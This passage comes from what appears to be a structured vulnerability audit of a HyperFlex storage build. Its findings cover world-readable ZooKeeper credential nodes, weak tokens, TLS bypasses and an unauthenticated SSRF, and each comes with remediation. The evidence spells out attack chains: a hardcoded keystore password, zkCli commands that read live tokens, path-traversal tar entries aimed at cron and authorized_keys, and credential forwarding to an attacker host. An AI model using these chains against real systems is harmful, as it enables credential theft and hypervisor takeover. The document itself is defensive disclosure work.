                "new SecretKeySpec(bytes, 0, len, ENCRYPTION_KEY_ALGORITHM). "
                "No additional protection beyond base64 encoding."
            ),
            "credential_encryption": (
                "setHypervHostCreds$3 (offset 79-87): "
                "EncryptionUtil$.encryptData(hypervPassword, aesKeyFromZK) → encryptedStr. "
                "setHypervHostCreds$5 (offset 40-60): "
                "ZkPersistenceManager.write(zkAuthKey='/stSSOMgr/auth', zkCredsKey='creds', "
                "encryptedStr, ttlMillis). "
                "Both keyData (AES key) and creds (encrypted with that key) stored in the "
                "same ZK node /stSSOMgr/auth with OPEN_ACL_UNSAFE (world:anyone:cdrwa, HX-F55). "
                "EncryptionUtil$.decryptData() uses the same AES key for decryption."
            ),
            "zk_acl": (
                "Per HX-F55: ZooKeeper curator client at /etc/hyperflex/secure/zookeeper.properties "
                "never calls withACL() — all nodes created with OPEN_ACL_UNSAFE. "
                "zkctl (or any unauthenticated ZK client on port 2181) can read "
                "/stSSOMgr/auth/keyData and /stSSOMgr/auth/creds without credentials. "
                "Combined recovery: read keyData → base64-decode → AES key → "
                "decrypt creds → plaintext Hyper-V password."
            ),
        },
        "impact": (
            "Any process or user with ZooKeeper access (port 2181) on the stCtlVM network "
            "can recover Hyper-V host credentials without authentication. "
            "Hyper-V credentials provide full access to the Windows hypervisor hosting HyperFlex "
            "nodes in Hyper-V deployment scenarios: VM lifecycle control, storage access, "
            "and lateral movement to all workloads on the Hyper-V cluster. "
            ""
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Apply ZooKeeper ACLs to /stSSOMgr/auth (digest ACL, stSSOMgr service account only). "
            "2. Store the AES encryption key outside ZooKeeper — in the JCEKS keystore at "
            "/etc/hyperflex/secure/hyperflex_keystore.jceks (already used by EncryptionUtil$). "
            "3. If credentials must be in ZK, use envelope encryption: encrypt the AES key "
            "with the keystore-resident vcenter_client private key before storing in ZK. "
            "4. Rotate Hyper-V credentials on any system where this ZK path was readable."
        ),
    },

    "HX-F70": {
        "title": "ESX, vCenter, and UCSM Credentials Stored as AES-Encrypted Blobs in World-Readable ZK Nodes (ZKNodeService_StMgr)",
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-312",
        "component": "stMgr-1.0.jar / ZKNodeService_StMgr / EsxAuthZKMgmtImpl / ZKEntryConstants",
        "class": "Credentials in Unprotected Storage",
        "confirmed": True,
        "evidence": {
            "zk_fields": (
                "ZKEntryConstants defines these ZK credential fields: "
                "'esx_username', 'esx_password' (ESX service account), "
                "'url_vcenter_encrypted_user', 'url_vcenter_encrypted_password' (vCenter admin), "
                "'ucsm_user', 'ucsm_pwd' (UCS Manager admin). "
                "All stored via ZKNodeService_StMgr.setEsxCredentials(user, pass), "
                "setVCenterEncryptedUser()/setVCenterEncryptedPassword(), "
                "setUcsmEncryptedUser()/setUcsmEncryptedPassword()."
            ),
            "encryption": (
                "EsxAuthZKMgmtImpl.setEsxCredentialsToZK(String user, String pass): "
                "EncryptionUtil$.encryptData(user) → encryptedUser; "
                "EncryptionUtil$.encryptData(pass) → encryptedPass; "
                "zkSvc_Mgr.setEsxCredentials(encryptedUser, encryptedPass). "
                "EsxAuthZKMgmtImpl.getEsxCredentialsFromZK(): "
                "zkSvc_Mgr.getEsxCredentials() → (encUser, encPass); "
                "EncryptionUtil$.decryptData(encUser) → plainUser; "
                "EncryptionUtil$.decryptData(encPass) → plainPass. "
                "EncryptionUtil$ uses symmetric AES with key from JCEKS keystore. "
                "JCEKS keystore password = 'springpath' (hardcoded, HX-F58)."
            ),
            "zk_acl": (
                "Per HX-F55: ZooKeeper curator client never sets ACLs — "
                "all nodes created with OPEN_ACL_UNSAFE (world:anyone:cdrwa). "
                "Any unauthenticated ZK client on port 2181 can read all credential fields. "
                "Per HX-F69: ZK client auth (UUID token scheme) cannot be enabled via config — "
                "Boolean.getBoolean API misuse permanently disables it."
            ),
            "recovery_chain": (
                "1. zkctl (or any ZK client) reads esx_username, esx_password fields. "
                "2. Load /etc/hyperflex/secure/hyperflex_keystore.jceks with password 'springpath'. "
                "3. Extract AES key from keystore (EncryptionUtil key alias). "
                "4. AES-decrypt both ciphertext blobs → plaintext ESX service account credentials. "
                "Repeat for url_vcenter_encrypted_user/password and ucsm_user/ucsm_pwd. "
                "Five credential pairs (ESX user, ESX pass, vCenter user, vCenter pass, "
                "UCSM user, UCSM pass) all recoverable via the same keystore key."
            ),
        },
        "impact": (
            "Attacker with ZooKeeper port 2181 access recovers plaintext credentials for: "
            "(1) ESX service account — root-equivalent access to all HyperFlex ESXi nodes; "
            "(2) vCenter administrator account — full virtualization management plane control "
            "(create/destroy/migrate VMs, snapshot, network policy); "
            "(3) UCS Manager administrator account — complete UCS fabric control "
            "(blade server chassis, fabric interconnects, policies, firmware, pools). "
            "Three infrastructure layers compromised from a single unauthenticated ZK read."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Apply ZooKeeper node ACLs to all credential-holding paths "
            "(digest ACL, stMgr service account only). "
            "2. Store the encryption key outside ZooKeeper and outside the keystore that uses "
            "a hardcoded password — use a hardware security module or OS-native secret store. "
            "3. Use distinct encryption keys per credential class. "
            "4. Rotate ESX, vCenter, and UCSM credentials immediately on any affected system. "
            "5. Fix ZK client auth (HX-F69) to prevent unauthenticated connections."
        ),
    },

    "HX-F74": {
        "title": "LocalUserSessionManager.generateToken() Ignores Credentials, Returns SecureRandom.nextInt(31) — 31 Possible Token Values",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-338",
        "component": "hx-aaa / gateway / pamAuthenticator / LocalUserSessionManager / generateToken",
        "class": "Weak Token Generation — Insufficient Entropy in PAM Session Token",
        "confirmed": True,
        "evidence": {
            "bytecode": (
                "LocalUserSessionManager.generateToken(String username, String password) bytecode: "
                "Offset 11: getfield rand:SecureRandom. "
                "Offset 15: bipush 31. "
                "Offset 17: invokevirtual SecureRandom.nextInt:(I)I. "
                "Offset 20: istore_3. "
                "Offset 21: iload_3. "
                "Offset 22: invokestatic String.valueOf:(I)Ljava/lang/String. "
                "Offset 25: areturn. "
                "Both parameters (username and password) are never accessed — "
                "the method reads only rand.nextInt(31), converts to String, and returns."
            ),
            "token_space": (
                "SecureRandom.nextInt(31) produces a uniformly distributed integer in [0, 30]. "
                "Token output is one of: '0', '1', '2', ..., '30'. "
                "Entropy = log2(31) ≈ 4.95 bits. "
                "Exhaustive enumeration = 31 attempts maximum. "
                "At SSO session validation rate (not rate-limited at PAM layer), "
                "brute-force completes in under 1 second."
            ),
            "usage_context": (
                "StPamAuthentication.signIn(username, password) calls generateToken(user, pass) "
                "after successful PAM authentication, stores result in HxCredentials sdkSession field. "
                "The token is subsequently stored in AAAStoreZKPersistAgent session table "
                "(sdkSession field of SSOSessionInfo) — persisted at /rest/aaa/ ZK subtree. "
                "StPamAuthentication.validateToken(user, pass, token) calls tokenToUserNamePassword(token), "
                "which Base64-decodes and splits on ':' — incompatible with the integer token format "
                "generated by generateToken, meaning validateToken always returns false for these tokens. "
                "PAM session invalidation path is broken; the token function is vestigial."
            ),
        },
        "impact": (
            "PAM-authenticated user session tokens have only 31 possible values. "
            "If PAM session tokens are used for any re-authentication or credential recovery path, "
            "they can be guessed in at most 31 attempts with no rate limiting at the token layer. "
            "The tokenToUserNamePassword incompatibility (Base64-decode of an integer string) "
            "means the intended session invalidation flow does not work as designed, "
            "potentially leaving sessions that cannot be properly revoked."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace SecureRandom.nextInt(31) with SecureRandom.generateSeed(32) or "
            "equivalent 256-bit random value encoded as hex/Base64. "
            "Fix tokenToUserNamePassword to be compatible with the token format generated by generateToken, "
            "or remove the dead code path entirely. "
            "Use a proper session token registry (not encoding credentials in the token)."
        ),
    },
    "HX-F75": {
        "title": "Active Service Auth Tokens Stored at World-Readable ZK Path /rest/aaa/service_auth_table",
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": "hx-aaa / gateway / serviceAuth / HxServiceAuthentication / saveServiceAuthInfoForServiceAuthToken",
        "class": "Token Exposure — Live Service Tokens in Unauthenticated ZK",
        "confirmed": True,
        "evidence": {
            "zk_paths": (
                "HxServiceAuthentication.class constant pool: "
                "ldc #36: String '/rest/aaa/service_auth_table' — used in getChildren(), getValueForKey(), "
                "saveTokenWithClientId(), and deleteAuthToken(). "
                "saveServiceAuthInfoForServiceAuthToken stores ServiceAuthInfo JSON at "
                "/rest/aaa/service_auth_table/<token> (token-keyed child nodes). "
                "ServiceAuthInfo fields: clientId, serviceAuthToken, refreshToken, loginTime. "
                "isValidServiceAuthToken() validates by reading child nodes at this path. "
                "delClientIdSubscribersZkPathPrefix field: configured via sysmgmt.deleteClientIdSubscribers."
            ),
            "open_acl_chain": (
                "ZK path /rest/aaa/service_auth_table/* uses OPEN_ACL_UNSAFE (world:anyone:cdrwa) "
                "inherited from ZK cluster global ACL policy (HX-F55). "
                "ZK client auth permanently disabled (HX-F69 Boolean.getBoolean misuse). "
                "Any process on stCtlVM network TCP 2181 can: "
                "  (1) List children: zkCli.sh ls /rest/aaa/service_auth_table -> token list "
                "  (2) Read each: zkCli.sh get /rest/aaa/service_auth_table/<token> -> ServiceAuthInfo JSON "
                "  (3) Extract serviceAuthToken value from JSON -> valid X-ServiceAccessToken header value."
            ),
            "attack_path": (
                "Extracted X-ServiceAccessToken used in HTTP request to HyperFlex Connect REST API. "
                "ServiceAccessAuthFilterImpl.validateServiceAccessToken(token) reads same ZK path "
                "for validation — reads back the ServiceAuthInfo we just extracted, confirms clientId match. "
                "SSOManager.validateServiceAccessToken() at offset 132-135 stores HxSaJWT session info "
                "via setClientInfo, setting 'Authenticated=True' for downstream filter. "
                "Full service-level API access without any credential authentication. "
                "Additionally: write access to /rest/aaa/service_auth_table/* enables "
                "injecting attacker-controlled service tokens to impersonate any service client."
            ),
            "service_auth_table_structure": (
                "ServiceAuthInfo(clientId, serviceAuthToken, refreshToken, loginTime). "
                "serviceAuthToken is a JWT or opaque token issued by SSOManager.createServiceAuthToken(). "
                "refreshToken enables token refresh without re-authentication. "
                "All active inter-service auth sessions (e.g., hxclone -> stmgr, stmgr -> aaa) "
                "have live tokens stored in this table — extraction gives access to all service APIs."
            ),
        },
        "impact": (
            "All active HyperFlex inter-service auth tokens are exposed at ZK path "
            "/rest/aaa/service_auth_table with OPEN_ACL_UNSAFE ACL. "
            "Attacker with ZK port 2181 access can enumerate and extract valid X-ServiceAccessToken "
            "values for any registered HX service (stmgr, hxclone, arbitrator, etc.). "
            "Extracted tokens bypass ServiceAccessAuthFilterImpl validation and grant "
            "authenticated service API access."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store service auth tokens with CREATOR_ALL_ACL (not OPEN_ACL_UNSAFE). "
            "Fix HX-F69 so ZK client authentication is actually enabled via storfs.cfg. "
            "Add token expiration enforcement and reduce token lifetime to the minimum required. "
            "Primary remediation: fix HX-F55 (ZK OPEN_ACL_UNSAFE) and HX-F69 (ZK auth disabled). "
            "Secondary: rotate all service auth tokens after ZK ACL fix."
        ),
    },
    "HX-F76": {
        "title": "connector_ctl backup Creates Unencrypted Tarball; restore Extracts Arbitrary Tarball to / Without Verification",
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-23",
        "component": "hxdc-connector / bin / connector_ctl / backup + restore operations",
        "class": "Insecure Backup — Unencrypted Backup + Unsigned Restore Enabling Arbitrary File Write",
        "confirmed": True,
        "evidence": {
            "backup_unencrypted": (
                "connector_ctl backup operation (bin/connector_ctl lines 37-43): "
                "'tar -czf $3/connector.tgz $2/db/connector.db' "
                "Creates unencrypted gzip tarball of connector.db. "
                "Source comment: '# TODO - encrypt pkg' — encryption was never implemented. "
                "connector.db is an SQLite database containing HX Data Connect configuration including "
                "Intersight registration tokens, vCenter credentials, and cloud integration secrets."
            ),
            "restore_arbitrary_write": (
                "connector_ctl restore operation (bin/connector_ctl lines 50-62): "
                "'tar xzf $3 -C /' "
                "Extracts the provided tarball to filesystem root / without: "
                "  (1) decryption (TODO - decrypt) "
                "  (2) signature or integrity verification "
                "  (3) path sanitization or chroot constraint. "
                "Any path within the tarball resolves relative to /. "
                "A crafted tarball with entries like '../../../etc/cron.d/backdoor' "
                "or '../../root/.ssh/authorized_keys' writes to arbitrary paths as the process UID."
            ),
            "tech_support_partial_redaction": (
                "connector_ctl tech_support operation (lines 22-30): "
                "Copies connector.db to support bundle, then removes lines matching 'AccessKeyId' "
                "and 'AccessKey' via sed — strips AWS credentials only. "
                "All other connector.db content (Intersight tokens, vCenter credentials, "
                "OAuth client secrets, SmartAccount info) is included unredacted in tech support bundles. "
                "Tech support bundles are transmitted to Cisco TAC — sensitive data exposure."
            ),
        },
        "impact": (
            "An attacker who can supply a crafted tarball to the connector_ctl restore operation "
            "achieves arbitrary file write to any path on the stCtlVM filesystem as the hxdp process UID. "
            "An attacker who obtains a connector_ctl backup file (unencrypted) reads all HX Data Connect "
            "credentials including Intersight registration and cloud integration tokens. "
            "Tech support bundles transmitted to Cisco TAC include vCenter, OAuth, and SmartAccount "
            "credentials that should be redacted but are not."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement backup encryption using AES-256-GCM with a key derived from the cluster UUID. "
            "Implement restore signature verification (HMAC-SHA256 of tarball contents). "
            "Replace 'tar xzf $3 -C /' with extraction to a staging directory with explicit path "
            "allowlisting before installing files to final destinations. "
            "Expand tech_support redaction to cover all credential fields in connector.db "
            "(Intersight tokens, vCenter passwords, OAuth secrets, SmartAccount credentials)."
        ),
    },
    "HX-F78": {
        "title": (
            "StMgrClient.trustAll() Globally Disables TLS Certificate Validation in Encryption WAR JVM "
            "via HttpsURLConnection.setDefaultSSLSocketFactory() with No-Op X509TrustManager"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "hxdc / encryption-1.0.0 WAR / StMgrClient / trustAll()",
        "class": "TLS Certificate Validation Bypass — Global JVM Override Exposes All Encryption WAR HTTPS Channels to MITM",
        "confirmed": True,
        "evidence": {
            "trustAll_bytecode": (
                "StMgrClient.trustAll() (encryption-1.0.0/WEB-INF/classes/.../StMgrClient.class): "
                "offset 6: new StMgrClient$1 (anonymous X509TrustManager). "
                "offset 16: SSLContext.getInstance('TLS'). "
                "offset 22-32: SSLContext.init(null, TrustManager[]{StMgrClient$1}, new SecureRandom()). "
                "offset 36-39: HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()). "
                "offset 42-52: HttpsURLConnection.setDefaultHostnameVerifier(new StMgrClient$2()). "
                "setDefaultSSLSocketFactory and setDefaultHostnameVerifier are JVM-wide statics — "
                "all subsequent HttpsURLConnection instances in the encryption WAR JVM inherit these overrides."
            ),
            "trust_manager_noop": (
                "StMgrClient$1 implements javax.net.ssl.X509TrustManager: "
                "checkClientTrusted() → return (offset 0: return, accepts any client cert). "
                "checkServerTrusted() → return (offset 0: return, accepts any server cert, no chain validation). "
                "getAcceptedIssuers() → null (offset 0: aconst_null; offset 1: areturn, non-standard — "
                "JSSE implementations typically treat null as 'no accepted issuers', effectively accepting all)."
            ),
            "hostname_verifier_noop": (
                "StMgrClient$2 implements javax.net.ssl.HostnameVerifier: "
                "verify(String hostname, SSLSession session) → iconst_1; ireturn (always returns true). "
                "Certificate CN/SAN never checked against target hostname."
            ),
            "openClient_call_site": (
                "StMgrClient.openClient() offset 0: invokevirtual trustAll() — called before every connection. "
                "offset 22-35: new THttpClient(stMgrHost + '/stmgr') — stmgr accessed via HTTPS THttpClient, "
                "NOT TSocket. URL template: 'https://<stMgrHost>/stmgr' (InvokeDynamic #86 concat). "
                "offset 38-44: HxSecurity.getInstance().getLocalSessionId() → localSessionId. "
                "offset 52-57: THttpClient.setCustomHeader('X-RootSessionID', localSessionId). "
                "offset 58: new TBinaryProtocol(transport)."
            ),
            "scope_of_bypass": (
                "The encryption WAR JVM issues HTTPS connections to: stmgr (localhost), KMIP server "
                "(external key management), vCenter (optional), Intersight (optional). "
                "setDefaultSSLSocketFactory/setDefaultHostnameVerifier affect ALL HttpsURLConnection "
                "instances in the same JVM process — the bypass is not scoped to stmgr. "
                "KMIP operations (SEDConfiguration, executeEnableControllerSecuirty, "
                "executeDisableControllerSecuirty, executeCreateKmipCertPolicy) are all issued from "
                "this JVM after trustAll() pollutes the default socket factory."
            ),
            "ucsm_credential_exposure": (
                "StMgr.executeValidateLogin(ucsmHostname, ucsmUsername, ucsmPasswd, lang) called from "
                "AuthApiServiceImpl.validateUcsmLogin(UcsmCredentials) via ValidateLoginSource.validate(). "
                "UCSM credentials transmitted over the HTTPS-without-cert-validation THttpClient channel. "
                "An attacker performing MITM against the now-unvalidated TLS connection can intercept "
                "UCSM admin credentials in transit. UcsmCredentials.toString() constant pool #52='    password:' "
                "— any logger.debug(..., ucsmCredentials) also logs the cleartext password."
            ),
        },
        "impact": (
            "The encryption WAR is the trust boundary for HyperFlex drive encryption: it manages KMIP "
            "key requests, SED controller security operations, and KEK lifecycle. "
            "StMgrClient.trustAll() globally replaces the JVM default TLS socket factory with one that "
            "accepts any certificate with no CN/SAN or chain validation. "
            "A network-adjacent attacker (on the management network between the stCtlVM and its KMIP server) "
            "can present a self-signed or revoked certificate and intercept all KMIP key material — "
            "including the KEK passed to executeDisableControllerSecuirty — without triggering any error. "
            "Additionally, UCSM admin credentials relayed via executeValidateLogin are exposed to the same MITM path. "
            "Because setDefaultSSLSocketFactory operates at JVM scope (not per-connection), the bypass "
            "persists for the lifetime of the encryption WAR process and cannot be reverted by individual callers."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll() entirely. Replace with per-connection SSLContext pinned to the KMIP CA bundle "
            "and stmgr's certificate. "
            "For stmgr connectivity: configure THttpClient with an SSLContext that validates against the "
            "HyperFlex internal CA. "
            "For KMIP: enforce mutual TLS with operator-supplied KMIP CA in SEDConfiguration. "
            "UcsmCredentials.toString() should redact the password field to eliminate log exposure. "
            "Never call setDefaultSSLSocketFactory or setDefaultHostnameVerifier with accept-all implementations — "
            "these are JVM-wide and bleed across all connection pools in the process."
        ),
    },
    "HX-F79": {
        "title": (
            "stmgr.getStCtlVMSSHKeys Thrift RPC Decrypts and Returns Controller VM SSH Private Key "
            "from ZooKeeper — Plaintext Key Material Exposed Over HTTPS IPC Channel"
        ),
        "severity": "HIGH",
        "cvss": "7.2",
        "cwe": "CWE-312",
        "component": "stmgr / StMgrImpl / getStCtlVMSSHKeys / SshUtils$.decryptSSHKey",
        "class": "Sensitive Key Material Exposure — Controller VM SSH Private Key Returned in Thrift Response",
        "confirmed": True,
        "evidence": {
            "thrift_method_signature": (
                "StMgrImpl.getStCtlVMSSHKeys(Option<EntityRef>) → Future<SshKeyPair>. "
                "Returns SshKeyPair.apply(pvtkey: String, pubkey: String). "
                "pvtkey is the plaintext SSH private key of the target controller VM node."
            ),
            "decryption_chain_bytecode": (
                "StMgrImpl.getStCtlVMSSHKeys bytecode: "
                "offset 58: getstatic SshUtils$.MODULE$. "
                "offset 62: invokevirtual zkSvc_NodeQueryMgr(). "
                "offset 66: invokevirtual ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(nodeId). "
                "offset 69: invokevirtual SshUtils$.decryptSSHKey(encryptedKey) → byte[]. "
                "offset 72-75: new String(bytes, 'UTF-8') — plaintext private key as String. "
                "offset 83-100: same for public key via getStCtlSSHEncryptedPublicKey + decryptSSHKey. "
                "offset 108-114: SshKeyPair$.apply(pvtkey, pubkey). "
                "offset 117: Future$.value(sshKeyPair) — returned synchronously."
            ),
            "decryption_key_source": (
                "SshUtils$.decryptSSHKey(String) calls EncryptionUtil$.MODULE$.decryptData(encryptedKey, getEncryptionKey()). "
                "EncryptionUtil$.getEncryptionKey() → StorvisorKeystoreManager$.MODULE$.getEntry("
                "SecurityConstants$.STORVISOR_KEYSTORE_ENTRY_AES_ENCRYPTION) where "
                "STORVISOR_KEYSTORE_ENTRY_AES_ENCRYPTION = 'aes_encryption'. "
                "StorvisorKeystore path: system property 'sysmgmt.common.security.springpath_keystore_file'. "
                "Keystore password: /etc/hyperflex_shadow key 'keystore_password' "
                "(SecurityConstants$ string constant #198 = '/etc/hyperflex_shadow', #200 = 'keystore_password')."
            ),
            "zk_storage": (
                "Encrypted SSH private keys stored in ZooKeeper under paths read by "
                "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(nodeId). "
                "ZK is world-readable (HX-F55: OPEN_ACL_UNSAFE) and ZK auth is permanently disabled (HX-F69). "
                "Any process with ZK access can read encrypted key material. "
                "With /etc/hyperflex_shadow keystore_password + the JKS keystore file, "
                "decryption does not require calling the stmgr Thrift RPC."
            ),
            "auth_gate": (
                "stmgr is a Finagle HTTP/1.1 server. "
                "Server$Authenticator filter checks 'X-RootSessionID' header on every request "
                "(Server$Authenticator.checkRootSessionID(Request)). "
                "On failure: Future.exception(new GeneralSecurityException('Authentication Failed!')). "
                "JWT signing key is in ZK at world-readable path (HX-F71) — "
                "auth gate does not constitute a compensating control in this threat model."
            ),
        },
        "impact": (
            "SSH private keys of HyperFlex stCtlVM nodes are stored AES-encrypted in ZooKeeper and "
            "served decrypted over the stmgr Thrift HTTPS channel on request. "
            "A caller with a valid root session ID can retrieve the plaintext private key for any node. "
            "The decryption key (AES 'aes_encryption' entry in StorvisorKeystore) is protected only by "
            "the keystore password from /etc/hyperflex_shadow — any local process with filesystem read "
            "access can recover the keystore password, open the JKS keystore, extract the AES key, and "
            "directly decrypt SSH private keys from ZK without involving the Thrift API. "
            "Compromised controller VM SSH keys enable full lateral movement across all HX cluster nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Do not return decrypted private key material over any IPC channel. "
            "SSH key operations should remain server-side: if callers need to authenticate, "
            "delegate the SSH session to stmgr rather than exporting the private key. "
            "Protect /etc/hyperflex_shadow with strict DAC (0600, root-owned). "
            "Consider PKCS#11 HSM-backed key storage to prevent offline AES key extraction from the JKS file."
        ),
    },
    "HX-F80": {
        "title": (
            "StMgr.executeDisableControllerSecuirty Transmits SED Key Encryption Key (KEK) and UCSM "
            "Admin Credentials Inline in Single Thrift Call Over HTTPS IPC Channel"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-312",
        "component": "hxdc / encryption-1.0.0 WAR / EncryptionLocalSource / StMgrClient.executeDisableControllerSecuirty",
        "class": "Sensitive Key Material Exposure — KEK and UCSM Credentials Co-Located in Single Thrift Args Object",
        "confirmed": True,
        "evidence": {
            "thrift_signature": (
                "StMgr.executeDisableControllerSecuirty(ucsmHostname, ucsmUsername, ucsmPasswd, kek, jobType, lang). "
                "Field names from constant pool of executeDisableControllerSecuirty_args: "
                "#12=ucsmHostname, #16=ucsmUsername, #19=ucsmPasswd, #22=kek, jobType, lang. "
                "_Fields enum ordinals: UCSM_HOSTNAME(0), UCSM_USERNAME(1), UCSM_PASSWD(2), KEK(3), JOB_TYPE(4), LANG(5)."
            ),
            "kek_source_bytecode": (
                "EncryptionLocalSource.enableOrDisableControllerSecurity(Boolean, Object, String) "
                "when Boolean==false (disable path): "
                "offset 53-66: QueryLocalKeyParser.getDeployedLocalKey(lang).getSecurityKey() → storedKey. "
                "offset 73-85: storedKey.equals(requestBody.getSecurityKey()) — key verification gate. "
                "offset 88-121: extracts LocalPolicyEntityBody.{getUcsmHostname, getUsername, getPassword, getSecurityKey}. "
                "LocalPolicyEntityBody.getSecurityKey() mapped to kek field (arg position 4, Thrift fieldId=4). "
                "StMgrClient.executeDisableControllerSecuirty(hostname, username, password, securityKey, "
                "'encryptionLocalConfigDisable', lang) at offset 121."
            ),
            "kek_semantics": (
                "kek = Key Encryption Key for the SED (Self-Encrypting Drive) controller security policy. "
                "The KEK is the locally-set security passphrase that protects drive encryption keys "
                "in the local encryption policy. Its compromise allows decryption of SED-protected data "
                "without the KMIP external key manager."
            ),
            "transport_context": (
                "Transport: StMgrClient.openClient() calls trustAll() at offset 0 then opens "
                "THttpClient('https://<stMgrHost>/stmgr') — TLS cert validation globally disabled (HX-F78). "
                "An attacker performing TLS MITM (made possible by HX-F78) intercepts a single Thrift message "
                "containing UCSM admin credentials AND the SED KEK simultaneously. "
                "KEK verification at EncryptionLocalSource offset 73-85 does not protect against MITM — "
                "it only validates caller knowledge, not channel integrity."
            ),
        },
        "impact": (
            "The SED KEK and UCSM admin credentials are co-located in a single Thrift message body. "
            "A network-adjacent attacker performing TLS MITM (trivially enabled by HX-F78's global "
            "trust-all override) recovers both the drive encryption KEK and full UCSM administrative access "
            "in one intercepted message. "
            "KEK recovery enables offline decryption of SED-protected datastores. "
            "UCSM admin credentials provide full UCS domain control: server provisioning, "
            "VLAN/VSAN policy, firmware update, and service profile management across all compute nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Separate the KEK and UCSM credential flows into distinct, independently authenticated operations. "
            "Do not co-locate credentials and key material in the same Thrift call or message body. "
            "The KEK should be passed through a dedicated authenticated channel with per-operation audit logging. "
            "Fix the underlying TLS bypass (HX-F78) to ensure channel integrity; "
            "separation of concerns alone is insufficient while HX-F78 is not addressed."
        ),
    },
    "HX-F81": {
        "title": (
            "StorvisorSupportBundle /st-support/* Servlet Exposes Pre-Authentication SSRF — "
            "User-Controlled 'host' Parameter Fetched with ESX Admin Credentials via JVM-Wide Authenticator"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-918",
        "component": "ROOT-1.0.0 WAR / StorvisorSupportBundle / WebDownloader / HostCredentialsAccess",
        "class": "Pre-Authentication SSRF with Credential Forwarding — ESX Admin Credentials Exposed via 401 Challenge to Attacker-Controlled Host",
        "confirmed": True,
        "evidence": {
            "no_auth_filter": (
                "ROOT-1.0.0/WEB-INF/web.xml filter-mapping: "
                "AuditFilter, SPPrivilegedAuth, SessionAuth, SPBasicAuth, SPAuth are mapped to /rest/* and /internalsupport/* only. "
                "No filter is mapped to /st-support/*. "
                "StorvisorSupportBundle servlet registered at /st-support/* with no authentication or authorization filter. "
                "All HTTP methods (doGet, doPost both delegate to processRequest) are pre-authentication accessible."
            ),
            "ssrf_bytecode": (
                "StorvisorSupportBundle.processRequest(HttpServletRequest, HttpServletResponse): "
                "offset 22-25: request.getParameterValues('host') → String[] hostArray. "
                "offset 56-63: new HostCredentialsAccess() → ESX credentials from stmgr.getEsxCredential(). "
                "loop: offset 104=aload hostValue, offset 130=InvokeDynamic #1:makeConcatWithConstants(hostValue) "
                "→ url = 'https://<hostValue>/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath' "
                "(constant pool #161 = 'https://\\u0001/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath'). "
                "offset 149: WebDownloader.getStream(url, esxUser, esxPass) → InputStream. "
                "offset 157: FileUtils.copyStream(inputStream, zipOut) → response body."
            ),
            "credential_forwarding": (
                "WebDownloader.getStream(String url, String username, String password): "
                "offset 0-9: new WebDownloader$1(username, password) — anonymous Authenticator subclass "
                "that returns PasswordAuthentication(username, password) on getPasswordAuthentication(). "
                "offset 9: Authenticator.setDefault(authenticator) — JVM-WIDE default authenticator. "
                "offset 12-20: new URL(url).openStream() — fetches the attacker-controlled URL. "
                "When attacker's server responds with 401 WWW-Authenticate: Basic, "
                "the JVM Authenticator automatically provides ESX admin credentials in the retry request."
            ),
            "esxcredential_source": (
                "HostCredentialsAccess(): new ServiceAccess('localhost') → stmgr.getEsxCredential() via ThriftClient. "
                "EsxCredential.username and EsxCredential.password are VMware ESXi host credentials "
                "stored in the stmgr service (ServiceAccess.getEsxCredential() → StMgr$Client.getEsxCredential())."
            ),
            "auth_bypass_scope": (
                "No URL validation or allowlist on the 'host' parameter. "
                "Multiple hosts supported: request.getParameterValues() returns array; all values fetched. "
                "Response content of each fetched URL is streamed to attacker inside ZIP file (application/zip response). "
                "URL.openStream() follows HTTP redirects — attacker can chain to internal targets via redirect."
            ),
        },
        "impact": (
            "Any unauthenticated network-reachable caller can: "
            "(1) enumerate internal services by supplying internal hostnames/IPs as 'host' parameter values "
            "and reading the response streams; "
            "(2) exfiltrate ESX admin credentials by directing the server to an attacker-controlled HTTPS endpoint "
            "that challenges with 401 WWW-Authenticate: Basic — the JVM Authenticator responds with "
            "EsxCredential.username / EsxCredential.password automatically; "
            "(3) read content from any https:// URL reachable from the stCtlVM management interface. "
            "ESX admin credentials (VMware ESXi root or service account) provide full hypervisor control "
            "over all compute hosts in the HyperFlex domain."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add authentication filter mapping for /st-support/* matching the other servlet patterns. "
            "Validate the 'host' parameter against a whitelist of known HyperFlex cluster node IPs. "
            "Do not forward ESX credentials via Authenticator.setDefault() — this sets a JVM-wide authenticator. "
            "Use a per-connection credential injection mechanism. "
            "Consider removing StorvisorSupportBundle entirely if InternalSupportBundle (/internalsupport/*) "
            "provides equivalent functionality with proper authentication."
        ),
    },
    "HX-F82": {
        "title": (
            "WebDownloader.trustAllHttpsCertificates() Called in Class Static Initializer — "
            "Global JVM TLS Certificate Validation Disabled in ROOT WAR at Class Load Time"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "ROOT-1.0.0 WAR / WebDownloader / WebDownloader$TrustAllManager / WebDownloader$2",
        "class": "TLS Certificate Validation Bypass — Second Global JVM Override in ROOT WAR, Triggered at Static Init",
        "confirmed": True,
        "evidence": {
            "static_init_bytecode": (
                "WebDownloader static initializer (ROOT-1.0.0/WEB-INF/classes/.../WebDownloader.class): "
                "offset 0: invokestatic trustAllHttpsCertificates() — called at class load, before any instance. "
